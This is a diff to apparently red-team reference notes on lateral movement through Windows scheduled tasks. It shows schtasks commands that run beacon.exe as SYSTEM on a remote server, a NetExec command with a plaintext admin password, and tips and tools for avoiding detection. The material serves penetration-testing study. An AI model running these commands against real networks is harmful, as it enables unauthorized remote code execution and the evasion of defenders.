@@ -25,7 +25,7 @@ Create a scheduled task over a named pipe on SMB to execute a reverse shell.
 
 === "schtasks"
     ~~~ bat
-    schtasks.exe /s srv01.corp.local /create /tn "Background Task 72" /tr "c:\windows\temp\beacon.exe" /ru "NT Authority\SYSTEM" /sc onstart
+    schtasks.exe /s srv01.corp.local /create /tn "Background Task 72" /tr "c:\windows\temp\beacon.exe" /ru "NT Authority\SYSTEM" /sc once /st 12:00
     schtasks.exe /s srv01.corp.local /run /tn "Background Task 72"
     schtasks.exe /s srv01.corp.local /delete /tn "Background Task 72" /f
     ~~~
@@ -47,8 +47,16 @@ Create a scheduled task over a named pipe on SMB to execute a reverse shell.
 > **OpSec:**
 > To avoid detections modify the command of an existing task or overwrite the binary of an existing task.
 
+Execute a command in the context of a logged-in user ([source](https://github.com/Pennyw0rth/NetExec/pull/54)).
+
+=== "[[notes/tools/netexec]]"
+    ~~~ bash
+    netexec smb srv01.corp.local --local-auth -u administrator -p 'passw0rd' -M schtask -o CMD='whoami' USER='corp.local\jdoeadm'
+    ~~~
+
 Untested tools:
 
+- [SharpGhostTask](https://github.com/dmcxblue/SharpGhostTask)
 - [GhostTask](https://github.com/netero1010/GhostTask), create scheduled task trough direct registry interaction, no event generated
 - [TaskShell](https://github.com/RiccardoAncarani/TaskShell), modifies the command of a scheduled task
 
